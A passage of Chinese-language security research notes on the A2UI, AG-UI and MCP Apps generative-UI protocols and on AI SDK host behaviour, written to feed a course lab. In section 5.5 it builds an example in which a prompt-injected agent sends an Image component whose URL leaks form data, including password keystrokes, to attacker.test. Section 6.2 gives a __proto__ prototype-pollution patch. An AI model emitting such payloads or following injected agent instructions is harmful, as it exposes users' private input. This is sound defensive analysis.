> —— `what-is-a2ui.md` `[P]`

> "**Traditional approach:** Send HTML/JavaScript in iframes. - Heavy, visually disjointed. - Security complexity. - Doesn't match app styling. **Need:** Transmit UI that's safe like data, expressive like code." `[P]`

**它和 MCP Apps 是两种相反的「渲染权」分配**（A2UI 自己的对比表，`agent-ui-ecosystem.md` `[P]`）：

| | A2UI | MCP Apps |
|---|---|---|
| Approach | "Declarative component blueprints" | "Pre-built HTML via `ui://` URIs" |
| Rendering | "Native components (Angular, Flutter, Lit, etc.)" | "Sandboxed `iframe`" |
| Styling | "Host app controls: inherits design system" | "Isolated: remote server controls appearance" |
| Security | "Declarative data, no code execution" | "Sandboxed iframe isolation" |
| LLM generation | "✅ Designed for streaming output" | "❌ Pre-built by server" |

**这张表回答了暂定主题里「声明式还是自带渲染器」那个问题**：MCP Apps 是「server 自带渲染器（HTML+JS），宿主提供沙箱」；A2UI 是「宿主自带渲染器（组件目录），agent 只提供数据形状的 UI 描述」。前者的信任问题是「沙箱够不够严」，后者的信任问题是「目录里的组件够不够安全」。**L16 第七节说的「决策权在模型、渲染权在你」，严格对应的是 A2UI，不是 MCP Apps。** `[P2]`

### 5.2 消息：四条 + 两条函数调用

v1.0 协议文本：

> "The agent-to-renderer protocol defines four message types: - `createSurface` … - `updateComponents` … - `updateDataModel` … - `deleteSurface` …" `[P]`
> "every message streamed by the agent must be a JSON object containing exactly one of the following keys: `createSurface`, `updateComponents`, `updateDataModel`, `deleteSurface`, `callRendererFunction`, or `agentFunctionResponse`." `[P]`

反向（renderer→agent）：

> "contain exactly one of the following top-level keys: `action`, `callAgentFunction`, `rendererFunctionResponse`, or `error`." `[P]`

传输契约里有一条对熟悉 L16 的人特别眼熟：

> "1. **Reliable delivery**: Messages must be delivered in the order they were generated. A2UI relies on stateful updates (e.g., creating a surface before updating it), so out-of-order delivery can corrupt the UI state.
> 2. **Message framing**: The transport must clearly delimit individual JSON envelope messages (e.g., using newlines in JSONL, WebSocket frames, or SSE events)." `[P]`

**A2UI 把 L16 的整套分帧问题（八种空行、块边界）原样下推给了传输层**，而它推荐的传输层是 AG-UI：

> "**AG-UI** is the standard transport binding for Agent-to-User Interaction." `[P]`

### 5.3 组件树：邻接表，不是嵌套 JSON

> "The A2UI protocol defines the UI as a flat list of components. The tree structure is built implicitly using ID references. This is known as an adjacency list model."
> "This model allows the agent to send component definitions in any order. Rendering can begin as soon as the `root` component is defined"
> "There must be exactly one component with the ID `root` in the component tree … Until that component is defined, other component updates will have no visible effect, and they will be buffered until a root component is defined. Once a root component is defined, the renderer is responsible for rendering the tree in the best way possible based on the available data, skipping invalid references." `[P]`

> "Because components may reference children or data bindings that do not yet exist, renderers should handle missing references gracefully by rendering placeholders (progressive rendering)." `[P]`

**前端直觉会在这里走错的一点：「JSON 树天然无环」。** 嵌套 JSON 确实无环；**邻接表不是**。`{id:"a", children:["b"]}, {id:"b", children:["a"]}` 是一个合法的 `updateComponents`，每个组件单独看都通过 schema。我在 v1.0 协议全文里搜 `cycl`/`circular` **零命中**——规范没有说环怎么办。`[P]`（`grep -i "cycl\|circular"` 实测）一个朴素的递归渲染器遇到环会无限递归、栈溢出、整个页面白屏。同理，一个节点被两个父节点引用（DAG）规范也没禁止，React 渲染时会出现重复 key 或同一状态被渲染两次。`[P2]`

所以 lab 的「组件树对目录的校验」必须做：恰好一个 `root`；每个 `children` 引用要么存在要么记为 `missing`（**不是**错误——规范要求渲染占位）；环检测；多父检测；深度上限（深度上限**没有一手数字**，lab 用一个声明出来的常量）。

### 5.4 目录（catalog）与信任模型

> "The set of available UI components and functions is defined in a **Catalog**. … While the Basic Catalog is useful for starting out, most production applications will define their own catalog to reflect their specific design system. The agent must generate messages that conform to the catalog understood by the renderer." `[P]`

**`catalogId` 长得像 URL，但不许去取**：

> "`catalogId` is a string identifier, not a resolvable URI; while it is conventionally formatted as a URI (e.g., `https://mycompany.com/1.0/somecatalog`) to avoid naming collisions across organizations, it does not need to point to any deployed resource or downloadable file." `[P]`
> "While conventionally formatted as a URI to avoid naming collisions across organizations, it is an arbitrary string ID and not a resolvable URI." `[P]`

前端工程师看到 `"catalogId": "https://a2ui.org/specification/v1_0/catalogs/basic/catalog.json"` 的第一反应是 `fetch` 它。**这恰恰是信任模型的反面**：目录必须是渲染器**本地**的、你审过的东西；按 agent 给的 URL 去拉目录，等于让 agent 决定你有哪些组件。`[P2]`

没有回退：

> "There is **no fallback** to the list of catalogs declared in `rendererCapabilities` (even if the renderer only advertises a single supported catalog). Every component and function call must resolve through either its explicit `catalogId` or the surface default `catalogId`." `[P]`

组合约束（v1.0）：

> "`allowedParents` (array of strings, optional): … If omitted, all parent component types are allowed. `allowedChildren` … If omitted, all child component types are allowed."
> "If a component is placed under an unallowed parent, the renderer emits a validation error message with `code` set to `"UNALLOWED_PARENT"`." `[P]`

命名规则（v1.0，跨语言一致性的一个好例子）：

> "all catalog entity identifiers—specifically **component names**, **function names**, and **argument/property names**—MUST adhere strictly to Unicode Standard Annex #31 (UAX #31) … `^[\p{XID_Start}_][\p{XID_Continue}]*$`" `[P]`

（lab 不实现 UAX #31——JS 的 `\p{XID_Start}` 与 Python `re` 的支持不一致，Python 标准库 `re` 不支持 `\p{...}`。这本身就是一个「跨语言一致的真实成本」案例，可以在 PyMirror 里点一句，lab 用 ASCII 子集 `^[A-Za-z_][A-Za-z0-9_]*$`。`[P2]`）

### 5.5 「不执行代码」为什么不等于「不外泄」——A2UI 版的「渲染即发送」

A2UI 的安全卖点：

> "A core selling point of A2UI is security through restriction. By prohibiting arbitrary code execution (like injecting raw JavaScript) from the agent, A2UI ensures that agents can only trigger pre-registered behaviors."
> —— `actions.md` §Security Considerations `[P]`

> "**1. Security:** Declarative data, not code. Agent requests components from client's trusted catalog. No code execution risk." —— `what-is-a2ui.md` `[P]`

这句话对「代码执行」是对的。但看 basic catalog 里的 `Image`（v0.9.1）：

```json
"url": { "$ref": "https://a2ui.org/specification/v0_9/common_types.json#/$defs/DynamicString",
         "description": "The URL of the image to display." }
```
> `[P]`（`Video`、`AudioPlayer` 同样有 URL 属性）

而 `DynamicString` 的定义：

```json
"DynamicString": { "oneOf": [ {"type":"string"}, {"$ref":"#/$defs/DataBinding"},
  {"allOf":[{"$ref":"#/$defs/FunctionCall"},{"properties":{"returnType":{"const":"string"}}}]} ] }
```
> —— `common_types.json` `[P]`

`formatString` 可以把数据模型插进字符串，而且对象会被整体序列化：

> "Values from the data model can be interpolated using their JSON Pointer path. - `${/user/profile/name}`: Absolute path."
> "**Objects/Arrays**: Stringified as JSON to ensure consistency across different renderer implementations." `[P]`

再加上双向绑定的「每次按键立即写入本地数据模型」和「绑定的组件实时重渲染」：

> "When the user interacts with the component (e.g., types a character, toggles a box), the renderer **immediately** updates the value at the bound `path` in the local Data Model."
> "If a `TextField` is bound to `/user/name`, and a separate `Text` label is also bound to `/user/name`, the label must update in real-time as the user types in the text field." `[P]`

把这四条拼起来 `[P2]`：一个（被注入的）agent 发出

```json
{"id":"px","component":"Image",
 "url":{"call":"formatString","returnType":"string",
        "args":{"value":"https://attacker.test/p?d=${/form}"}}}
```

渲染器会：在 `root` 下挂一个看不见的图片 → 解析 `${/form}` → 把整个表单对象 JSON 序列化进 URL → 浏览器发请求。**之后用户在同一个 surface 的密码框里每敲一个字，这个 Image 都会重渲染、再发一次请求。** 没有一行代码被执行，所有组件都在目录里，所有消息都通过 schema 校验。

而 A2UI 自己的文档恰好说了相反的话：

> "User inputs (keystrokes, toggles) do **not** automatically trigger network requests to the agent." `[P]`

这句话的字面意思是对的——**不会发给 agent**。会发给 `Image.url` 指向的任何地方。

**这是本节最值得讲的反转之一**：声明式 UI 消除了「执行」这条路，但没消除「加载」这条路；而数据绑定让「加载」能携带**用户在 agent 看不见的地方输入的数据**——这比 L16 第八节的 markdown 图片更糟，因为 markdown 图片只能外泄模型上下文里有的东西。防御必须在**目录**里写：URL 型属性只接受字面量字符串且主机在白名单内，或者绑定路径在一个显式的「可出网」白名单里；`formatString` 不得出现在 URL 型属性里。lab 的目录校验器把这条做成断言。

（另一条通道：`openUrl` 函数 `"Opens the specified URL in a browser or handler."`，`args.url` 是 `"format": "uri"` 的任意字符串 `[P]`。它需要用户点击按钮才触发，属于「点击即发送」，比 Image 弱一档，但同样可以带绑定数据。）

### 5.6 多 agent：`sendDataModel` 与「状态刮取」

> "`sendDataModel` (boolean, optional): If true, the renderer will send the full data model of this surface in the metadata of every message sent to the agent" `[P]`

> "**WARNING: Security Risk - State Scraping**: If an orchestrator fails to strip the `a2uiClientDataModel`, a malicious or compromised sub-agent could read the state of other active surfaces. For example, a weather sub-agent could scrape sensitive data from a banking surface if the orchestrator leaks the entire multi-surface data model. Stripping is a mandatory security requirement for multi-agent systems." —— `actions.md` `[P]`

**谁决定 `sendDataModel`？agent 自己**——它是 `createSurface` 里由 agent 发出的字段。`[P]` 所以「这个 surface 的用户输入要不要回传给我」是 agent 单方面打开的开关。L14 的视角：这是一个由**不可信方**设置的数据流向开关，宿主应当对它有自己的策略（例如只对你自己的 agent 允许）。`[P2]`

另一个跨协议陷阱——**`null` 的含义**：

> "If the value is `null`, the key at that path is removed." —— A2UI `updateDataModel` `[P]`

而在 JSON Patch（AG-UI 的 `STATE_DELTA`）里 `{"op":"replace","path":"/x","value":null}` 是「把 x 设为 null」。同一个前端若同时接 AG-UI 和 A2UI（A2UI 的标准传输就是 AG-UI），**同一个 `null` 在两条路径上意思相反**，而且 A2UI 里没有办法把一个值设成 `null`。`[P]`（两条规范原文）

### 5.7 agent 调用渲染器函数（v1.0）

> "This message is sent by the agent to execute a function registered on the renderer. Functions are catalog-defined abstractions that avoid sending raw executable code across the wire. Only functions which have `allowedCallers: "agentOnly"` or `allowedCallers: "rendererOrAgent"` in their catalog definition can be called by the agent."
> "If the requested function is configured in the catalog as `"rendererOnly"`, or if the function is not registered at all, the renderer MUST immediately reject the call and return a renderer-to-agent `error` message with `code: "INVALID_FUNCTION_CALL"`." `[P]`

**这和 MCP Apps 的 `visibility` 是同一个问题的镜像**：MCP Apps 问「这个 server 工具，UI 能不能调」；A2UI 问「这个渲染器函数，agent 能不能调」。两者都是**按调用方**的白名单，两者的默认值方向不同（MCP Apps 省略 = 双方都能调；A2UI 未注册 = 拒绝）。lab 里两个闸门用同一个形状的纯函数实现，学员能直接看到「默认放行」与「默认拒绝」的差别。`[P2]`

### 5.8 与 MCP Apps 的三种组合模式

A2UI 文档给了三种，全部有官方指南 `[P]`：

**模式一：A2UI over MCP**（`a2ui_over_mcp.md`）——MCP 工具直接返回 A2UI JSON，**没有 iframe**：

> "Layouts containing component trees (`createSurface` and `updateComponents`) with data bindings … are served as MCP resources under custom URIs (e.g., `a2ui://recipe-form`, `a2ui://recipe-card`) with MIME type `application/a2ui+json`."
> "When a tool executes, the server returns only the dynamic values needed by the template, packaged as an A2UI `updateDataModel` message."
> "The tool links to its presentation template by including a `_meta.ui` object in its tool definition and in its `CallToolResult`: `"_meta": { "ui": { "resourceUri": "a2ui://recipe-card", "mimeType": "application/a2ui+json" } }`" `[P]`

注意：**它借用了 MCP Apps 的 `_meta.ui.resourceUri`，但 scheme 是 `a2ui://` 不是 `ui://`、MIME 是 `application/a2ui+json`**，还加了 MCP Apps 没有的 `mimeType` 键。MCP Apps 规范说 UI 资源 "URI MUST start with `ui://`" 且 "`ui://` will be reserved for MCP Apps" `[P]`。推论 `[P2]`：只认 MCP Apps 的宿主看到 `a2ui://` 应当拒（或更糟：不校验 scheme 就 `resources/read`、把 JSON 当 HTML 塞进 iframe）。lab 断言：`resourceUri` 非 `ui://` 开头不得进入 MCP Apps 渲染路径。

**模式二：MCP Apps in A2UI**（`mcp-apps-in-a2ui.md`）——A2UI 的 surface 里有一个组件，它内部是一个 MCP App 的双层 iframe。官方文档原文：

> "Standard single-iframe sandboxing with `allow-scripts` is often bypassed if combined with `allow-same-origin`, which defeats the containerization. … To prevent this, A2UI strictly excludes `allow-same-origin` for the inner iframe where the third-party application runs."
> "1. **Sandbox Proxy (`sandbox.html`)**: An intermediate `iframe` **served from the same origin**. … Permissions: **Do not sandbox** in the host template"
> "2. **Embedded App (Inner Iframe)**: … Injected dynamically via `srcdoc` with restricted permissions. - Permissions: `sandbox="allow-scripts allow-forms allow-popups allow-modals"` (**MUST NOT** include `allow-same-origin`, `allow-top-navigation`, or `allow-top-navigation-by-user-activation`)."
> "- Hyperlink exfiltration defense: **Omitting `allow-popups`** and capturing link navigations prevents untrusted content from exfiltrating data via clickjacking into spawned windows." `[P]`

**三处值得课上点名的问题**（全部来自同一份官方文档 + 同仓库的代码）：

1. **代理与宿主同源，违反 MCP Apps 的 MUST**（"The Host and the Sandbox MUST have different origins"）。A2UI 换了另一种隔离：代理同源且不加沙箱，第三方代码放内层 srcdoc、不给 `allow-same-origin`，内层是不透明源。隔离上成立（内层摸不到任何东西），但它**不是 MCP Apps 规范的架构**，且代价是内层无稳定 origin、`localStorage`/cookie 全不可用（文档自列 "Removes access to `localStorage`, `sessionStorage`, `IndexedDB`, and cookies due to unique origin"），依赖 `_meta.ui.domain` 做 CORS 白名单的 MCP App 跑不起来。`[P]`+`[P2]`
2. **同一段文字自相矛盾**：权限列表里**有** `allow-popups`，下一条又说防外泄靠「Omitting `allow-popups`」；代码里确实有（`sandbox.ts:71` `allow-scripts allow-forms allow-popups allow-modals` `[P]`），而同文件注释写 "THIS file is the outer sandbox proxy iframe **on a separate origin**"，与文档 "served from the same origin" 也对不上。`[P]`
3. **快速上手要求关掉安全自检**："Navigate to: `…/?disable_security_self_test=true` … bypass the security self-test that verifies iframe isolation … where the double-iframe setup may not pass strict origin checks (e.g., `localhost`)" `[P]`。自检是 `window.top!.alert(...)` 必须抛 SecurityError——**代理与宿主同源时它必然失败**，所以文档才要你关掉。`[P2]` 一个安全自检被写在入门指南里的开发参数关掉，是极好的教学案例。该代理对内层的 origin 校验是 `event.origin !== OWN_ORIGIN && event.origin !== 'null'`，注释写 "Security verification relies primarily on ensuring 'event.source === inner.contentWindow'" `[P]`——即 §3.2：对不透明源 `"null"` 白名单无区分力，真正起作用的是 `source`。

**模式三：A2UI in MCP Apps**（`a2ui-in-mcp-apps.md`）——反过来，一个 MCP App（iframe 里的第三方 HTML）内部用 A2UI 渲染器画 agent 生成的界面：

> "2. **MCP Application (Sandboxed)**: The untrusted third-party web application (e.g., a Lit or Angular micro-app) running inside a double-iframe sandbox. This app contains the A2UI surface." `[P]`
> "- **Null Origin Handling**: Remember that inside a strict sandbox (`sandbox="allow-scripts"` without `allow-same-origin`), `window.location.origin` will evaluate to `"null"`. You must validate incoming messages carefully by comparing `event.source` against the expected window object (e.g., `window.parent`)." `[P]`

`[P2]` 这一模式下 A2UI 的「宿主控制样式与安全」只在 iframe **内部**成立——渲染 A2UI 的是第三方 server 的代码，不是你。5.5 那条 Image 外泄在这里由 MCP Apps 的 CSP 兜底（`resourceDomains` 不含攻击者域就加载不了）。**两层机制各管一段，任何一层单独都不完整。**

### 5.9 采用（A2UI 自述）

`a2ui-in-the-world.md` 列出的生产部署：Google Opal、Gemini Enterprise（"currently requires self-serve agents registered using the Agent-to-Agent (A2A) path"）、Flutter GenUI SDK（"GenUI SDK uses **A2UI as the underlying protocol**"）、Google ADK Web（"ADK integrated the A2UI v0.8 basic catalog"）；伙伴：AG-UI/CopilotKit（"day-zero A2UI compatibility"）。`[P]`（这是项目方自述，属一手但有利益相关；采用规模没有可核实的数字。）

## 6. AG-UI

> 一手来源：npm 包 `@ag-ui/core@1.0.2`、`@ag-ui/client@1.0.2`、`@ag-ui/mcp-apps-middleware@0.1.2`（`npm pack` 后读 `dist/*.d.ts` 与 sourcemap 里的 `sourcesContent`），访问 2026-10-12。RFC 6902 / RFC 6901 全文取自 `rfc-editor.org`。

### 6.0 再纠正上一轮：AG-UI 现在**有**协议版本号了

上一轮（2026-09-15）INV-22 的结论是「没有像 MCP 那样的版本号，钉 revision」。两天后情况变了：

> "## 1.0.0 — 2026-09-17
> - PROTOCOL_VERSION now reads "1.0"
> - Ships the AG-UI 1.0 specification, JSON Schema, and the generators SDKs are produced from."
> —— `@ag-ui/core` `CHANGELOG.md` `[P]`

> `declare const PROTOCOL_VERSION = "1.0";`
> —— `@ag-ui/core/dist/version-*.d.ts` `[P]`

而且这个版本号**上线了**：`@ag-ui/mcp-apps-middleware` 合成 `RUN_STARTED` 时带 `protocolVersion: PROTOCOL_VERSION`，源码注释说 "the synthesized RUN_STARTED declares the protocol version this middleware was built against (PROTOCOL_VERSION), never an echo of the input's version." `[P]`

上一轮引用的 `THINKING_*` 弃用预告也兑现了：1.0 的 `EventType` 枚举里**已经没有** `THINKING_*`。所以 L16x 用 AG-UI 时：钉 `PROTOCOL_VERSION = "1.0"`，不再说「没有版本」。

### 6.1 事件类型（1.0，31 个）

```text
TEXT_MESSAGE_START / _CONTENT / _END / _CHUNK
TOOL_CALL_START / _ARGS / _END / _CHUNK / _RESULT
STATE_SNAPSHOT / STATE_DELTA / MESSAGES_SNAPSHOT
ACTIVITY_SNAPSHOT / ACTIVITY_DELTA
RAW / CUSTOM
RUN_STARTED / RUN_FINISHED / RUN_ERROR / STEP_STARTED / STEP_FINISHED
REASONING_START / _MESSAGE_START / _MESSAGE_CONTENT / _MESSAGE_END / _MESSAGE_CHUNK / _END / REASONING_ENCRYPTED_VALUE
SUBAGENT_STARTED / SUBAGENT_FINISHED / SUBAGENT_ERROR
```
> —— `declare enum EventType`，`@ag-ui/core@1.0.2` `[P]`（31 个成员，逐行数）

相对上一轮引的 revision：新增 `SUBAGENT_*` 三个；`RUN_FINISHED` 带上了**结局**（outcome）。

**AG-UI 和 MCP Apps 不是同一层的东西**：MCP Apps 定义的是「iframe 里的第三方 UI ↔ 宿主」；AG-UI 定义的是「agent 后端 ↔ 你的前端应用」。前者的对手是**不可信的 UI 代码**，后者的对手是**你自己的 agent**（以及它背后可能被注入的模型）。L16 讲的 `reset-step` 那套流协议和 AG-UI 是同一层。`[P2]`

### 6.2 状态：快照与 RFC 6902 增量

```ts
/** Replaces the agent state wholesale. Sent when a delta cannot express the change, or to resynchronise a consumer. */
type StateSnapshotEvent = { type: EventType.STATE_SNAPSHOT; ... }
/** Changes the agent state incrementally. */
type StateDeltaEvent = { type: EventType.STATE_DELTA; ... }
/** Agent state. Any JSON value: the protocol carries state without interpreting it, so an object, an array, a string and a number are all valid. */
type State = any;
```
> `[P]`

JSON Patch 的定义及一个很关键的免责：

> "A JSON Patch document as defined by RFC 6902, referenced by STATE_DELTA.delta and ACTIVITY_DELTA.patch: an ordered sequence of operations applied to a target document. An empty array is a valid no-op patch. **Whether the operations actually apply to the document they target is a runtime question RFC 6902 leaves to the applier; structural validity here says nothing about it.**" `[P]`

> "Unlike the protocol's own objects, the operations are open: RFC 6902 section 4 requires members an operation does not define to be ignored rather than rejected, so a remove carrying a leftover value is a valid patch. Two of the RFC's rules are relations between values rather than shapes, so no static schema can express them and neither is checked here: a move whose from is a proper prefix of its path (section 4.4), and any operation whose pointer does not resolve in the target document. Both are the applier's to reject." `[P]`

**也就是说：通过了 AG-UI 的 schema 校验 ≠ 这个 patch 能应用。** 能不能应用、应用失败怎么办，全在你的 applier 里。RFC 6902 的原文规则（lab 断言的直接来源）：

> §3 "Operations are applied sequentially … the resulting document becomes the target of the next operation." §5 "if an operation is not successful … **application of the entire patch document SHALL NOT be deemed successful**." §4.1 index "MUST NOT be greater than the number of elements"（`-` 表示追加）. §4.4 "The 'from' location MUST NOT be a proper prefix of the 'path' location". §4.6 `test` "equal means … **of the same JSON type** … numbers … numerically equal … literals … the same." `[P]`

JSON Pointer（RFC 6901）："first transforming … '~1' to '/', and then … '~0' to '~'. By performing the substitutions in this order, an implementation avoids … turning '~01' first into '~1' and then into '/'"；`array-index` ABNF "leading zeros are not allowed … `%x30 / ( %x31-39 *(%x30-39) )`"。`[P]`

**这里藏着五个「看起来对、实际错」的 applier**（全部是 lab 的断言目标）：

| # | 错误实现 | 后果 | 依据 |
|---|---|---|---|
| 1 | 逐条应用，遇错就停，**保留已应用的部分** | 状态处于一个协议里从未存在过的中间态——UI 渲染出「一半旧一半新」 | §5 "entire patch document SHALL NOT be deemed successful" `[P]`；推论：必须对副本应用、失败整体回滚 `[P2]` |
| 2 | `~0`/`~1` 解码顺序反了 | 键名 `a~1b` 被解成 `a/b` 写错位置；`~01` 变 `/` | RFC 6901 §4 `[P]` |
| 3 | 数组下标用 `parseInt` | `"01"`、`"1e0"`、`" 1"` 都被接受 | RFC 6901 ABNF `[P]` |
| 4 | `test` 用语言的 `==` | **Python `True == 1`、`1 == 1.0` 都真**；JS `===` 把 `{a:1,b:2}` 与 `{b:2,a:1}` 判不等（引用比较） | §4.6 "of the same JSON type" `[P]`；§10 实测 |
| 5 | JS `obj[key] = value` | `{"op":"add","path":"/__proto__/isAdmin"}` **污染 `Object.prototype`** | `[P2]`（§10 实测）；AG-UI 文档未提及 |

第 5 条值得单独说：`STATE_DELTA` 来自 agent，agent 状态可被模型输出驱动、模型输出可被注入（L14）。**一个被注入的 agent 发出的 patch 能改写你前端里所有对象的原型**——「渲染即发送」之外、生成式 UI 前端第二个无需执行脚本的攻击面。`[P2]` 防御：applier 拒绝 `__proto__`/`constructor`/`prototype` 三个键段，或用 `Object.create(null)`/`Map`。（Python 侧无此问题，但 lab 要求两边同样拒绝以保持输出逐字节一致。）

### 6.3 ACTIVITY：生成式 UI 在 AG-UI 里的载体

> "Reports structured progress that is not conversation content, such as a step a UI renders as its own widget." `[P]`

`ACTIVITY_SNAPSHOT.replace`：

> "… only an explicit false asks a consumer to leave what is already there. It does not ask for a merge — ACTIVITY_DELTA is how content is changed incrementally. … @default true" `[P]`

`@ag-ui/mcp-apps-middleware` 正是把 MCP Apps 的工具结果包成一个 activity：

```ts
{
  type: "ACTIVITY_SNAPSHOT",
  activityType: "mcp-apps",
  content: { result, resourceUri, serverHash, serverId?, toolInput },
  replace: true
}
```
> —— middleware `README.md` `[P]`

**所以在 AG-UI 里 MCP App 就是「一个 activity 消息」**：前端拿到 `resourceUri` 后发代理请求 `resources/read`，再自己做 §2.7 的沙箱渲染。AG-UI 本身不规定如何沙箱化——那是前端（如 CopilotKit）的事。`[P2]`

### 6.4 前端工具与中断：「run 结束」不等于「agent 完成」

前端工具（frontend tool）：agent 调用一个由前端实现的工具，run 就此**以成功结束**，等待应用在下一次 run 的 `messages` 里给出结果：

> "pendingToolCallIds … for the application to answer in the next input's messages, in the order they were made. … On the success outcome rather than the event because **a run that stopped on a frontend tool call is a completed run**: whether the application continues the thread is its own decision, so the producer reports what it knows and no more." `[P]`

中断（interrupt）：

> "Something a run needs from outside before it can continue, such as an approval or a missing value." `[P]`
> "The run is paused, waiting for something outside it. **Resuming means starting a new run whose resume entries answer these interrupts.**" `[P]`

```ts
type Interrupt = { id; reason: string; message?; toolCallId?; responseSchema?; expiresAt?; subagentRunId?; metadata? }
type ResumeEntry = { interruptId; status: "resolved" | "cancelled"; payload?; metadata? }
type RunFinishedOutcome = Success | Interrupt | Cancelled
```
> `[P]`

**前端会意外的三点**：

1. **恢复是一次新 run。** 同 L16 第五节「中断后不能把半截消息放回去、要用新 user 消息恢复」：恢复永远是新请求。`[P2]`
2. **`expiresAt` 写错格式 = 永不过期**（"a value that is not one leaves the interrupt looking permanently unexpired" `[P]`）——「看不懂所以放过」的典型。
3. **认不出的 outcome 被当成成功**（"an outcome a consumer does not recognise is stripped and read as success — a cancellation added later would reach every 1.0 consumer as a completed run" `[P]`）——AG-UI 宽松解析的直接代价，作者自己写进了类型注释。lab 断言：未知 outcome 必须显式报 `unknown`，不得默认成功。

`Interrupt.responseSchema`："A JSON Schema describing the answer this interrupt expects, so a consumer can build a form for it. Carried opaquely: the protocol does not constrain or validate it." `[P]`——**agent 让前端画表单**，是 AG-UI 里最接近「声明式生成式 UI」的地方；schema 来自 agent（可被注入），前端要像 A2UI 那样对照**你自己的**目录（§5）渲染，不能直接信。`[P2]`

### 6.5 `@ag-ui/mcp-apps-middleware`：白名单写对了，可见性只做了一半

README 的白名单（与 MCP Apps 稳定版列出的 View 可用标准消息**完全一致**）：

> "The middleware accepts only `tools/call`, `resources/read`, `notifications/message`, and `ping` from an iframe proxy request. It rejects other methods before it connects to the MCP server." `[P]`

源码：

```ts
// Reject iframe methods before creating a credentialed MCP connection.
if (!["tools/call","resources/read","notifications/message","ping"].includes(method)) {
  throw new Error(`MCP method not allowed for UI proxy: ${method}`);
}
```
> —— `src/index.ts`（sourcemap）`executeMCPRequest` `[P]`

注意注释里的顺序意识："before creating a credentialed MCP connection"——**先拒绝，再建连接**，因为连接带着 server 的凭据（`headers`）。

可见性规则：

> "Tools are model-visible by default. An explicit `_meta.ui.visibility` list must include `"model"` to expose a tool to the agent; app-only tools remain available through the iframe proxy." `[P]`

```ts
function isModelVisibleTool(tool) {
  const ui = tool._meta?.ui;
  const visibility = ui && typeof ui === "object" && "visibility" in ui ? ui.visibility : undefined;
  return visibility === undefined || (Array.isArray(visibility) && visibility.includes("model"));
}
```
> `[P]`

这一半写得比 ext-apps 的辅助函数严谨：用 `includes`；`visibility` 不是数组时（比如误写成字符串 `"app"`）返回 **false**——fail-closed，和 basic-host 的 fail-open 正好相反。

**另一半——「app 方向」——没有做。** `handleProxiedMCPRequest` 查到 server 配置后直接 `executeMCPRequest(serverConfig, request.method, request.params)`；`tools/call` 分支直接 `client.callTool(params)`。**没有检查目标工具的 `visibility` 是否含 `"app"`。** `[P]`（读 sourcemap 源码第 347–410、414–470 行。）所以一个 `visibility: ["model"]` 的工具，可以经代理路径被调用。

而且代理请求的入口是 `input.forwardedProps.__proxiedMCPRequest`——也就是**前端发给 agent 后端的 RunAgentInput 里的一个字段**。`serverId`/`serverHash` 也由请求方提供。`[P]` 推论 `[P2]`：
- 「app 只能调**本 server** 的工具」（规范的 "same server connection only"）在这一层**无法验证**——后端不知道这个请求来自哪个 iframe，只知道请求方自称要访问哪个 server。这一条只能在前端的桥里执行。
- 能伪造 `forwardedProps` 的任何浏览器端代码，都能以后端持有的 server 凭据调用该 server 上**任何**工具。

这不是 AG-UI 的设计错误（它是「把 MCP Apps 接进 agent 后端」的中间件，信任边界在前端桥），但点出一个结构性事实：**MCP Apps 的可见性规则是宿主的责任，而「宿主」在 AG-UI 架构里被拆成前端桥 + 后端中间件两半，每一半都以为另一半在做。** 这正是 lab 把方法白名单、server 归属、可见性三道闸放进**同一个纯函数**的理由。

其他工程细节（README 原文 `[P]`）：server hash 不含 headers（浏览器可见引用不泄露凭据校验和）；同 transport+URL 的多配置须有不同 `serverId`，仅凭 hash 的请求被拒；MCP 连接不跟随重定向、须停在配置 origin、URL 不得含内嵌凭据；代理响应与发现错误都不回传原始上游 body；supporting-tool 链限 10 轮，超出则 fail。

## 7. Vercel AI SDK generative UI（对照）

> 一手来源：`ai-sdk.dev/docs/ai-sdk-ui/generative-user-interfaces.md`、`/docs/ai-sdk-rsc/overview.md`、`/docs/ai-sdk-core/mcp-apps`（经 `ai-sdk.dev/llms.txt`）；npm `ai@7.0.137`、`@ai-sdk/mcp@2.0.73`、`@ai-sdk/react@4.0.140` 源码（`npm pack`），访问 2026-10-12。

### 7.1 原本的「生成式 UI」：工具结果 → 你自己的 React 组件

> "Generative UI is the process of connecting the results of a tool call to a React component." `[P]`
> "In AI SDK 5.0, tool parts use typed naming: `tool-${toolName}` instead of generic types." `[P]`

`part.type === 'tool-displayWeather'` 时按 `part.state` 分支：`input-streaming / input-available / approval-requested / approval-responded / output-available / output-error / output-denied`。`[P]` **这和 A2UI 是同一种渲染权分配**（组件是宿主自己的，模型只决定调哪个工具、给什么参数），只是没有协议——组件目录就是你的 `switch`。RSC 路线（`streamUI`，模型直接流式输出 React 组件）官方已降级："AI SDK RSC is currently experimental. We recommend using AI SDK UI for production." `[P]`

**对 L16x 的意义**：前端最熟悉的「生成式 UI」其实是**零协议**方案，把信任问题全部消掉（没有第三方代码），代价是每个工具都要宿主写组件。MCP Apps 解决的正是「宿主没法为每个第三方工具写组件」，代价是信任问题回来了。`[P2]`

### 7.2 AI SDK 现在也是 MCP Apps 宿主——而且比参考实现严

`@ai-sdk/mcp` + `@ai-sdk/react` 提供了 `splitMCPAppTools`、`readMCPAppResource`、`experimental_MCPAppRenderer`。`[P]` 读源码后，**它在多个点上比 ext-apps 的 `AppBridge` 更保守**，正好可以当 lab 的「参照答案」之一：

| 点 | ext-apps `AppBridge`（2.0.3） | AI SDK（`@ai-sdk/react` 4.0.140 / `@ai-sdk/mcp` 2.0.73） |
|---|---|---|
| app 发起的 `tools/call` | `connect()` 自动转发，不查可见性（§2.4） | `allowedTools` **省略即全拒**："Deny-by-default: the (untrusted) MCP App may only invoke tools the host has explicitly allow-listed." `[P]` |
| 省略 `visibility` 的工具 | 规范默认 `["model","app"]` | `splitMCPAppTools` 只把它放进 `modelVisible`，**不放进 `appVisible`**（`visibility?.includes("app") === true`）`[P]`——比规范严，依赖默认值的 App 在 AI SDK 宿主里调不了自己的工具 `[P2]` |
| CSP | 宿主自建 | 只收 `https:`/`wss:`，`new URL()` 规范化后再查 `["'\`\s;,]`，拒绝 `*` 主机；**显式写 `form-action 'none'`、`base-uri 'none'`** `[P]` |
| `allow` | `"; "` 拼接 | `"; "` 拼接，且需宿主 `allowedPermissions` 白名单，省略即不给 `[P]` |
| tool input 时机 | 宿主决定 | 只在 `input-available`/`output-available` 发送；`approval-requested` 时**不发** `[P]`（`app-renderer.tsx`） |
| `ui/open-link` | 宿主决定 | 只放行 `https:`/`http:`/`mailto:` `[P]` |
| `resources/read` | 转发 | 仅限 `ui://` `[P]` |

**但也有三处「文档与代码不一致」和一处缺口**（全部第 10 节实测或源码直读）：

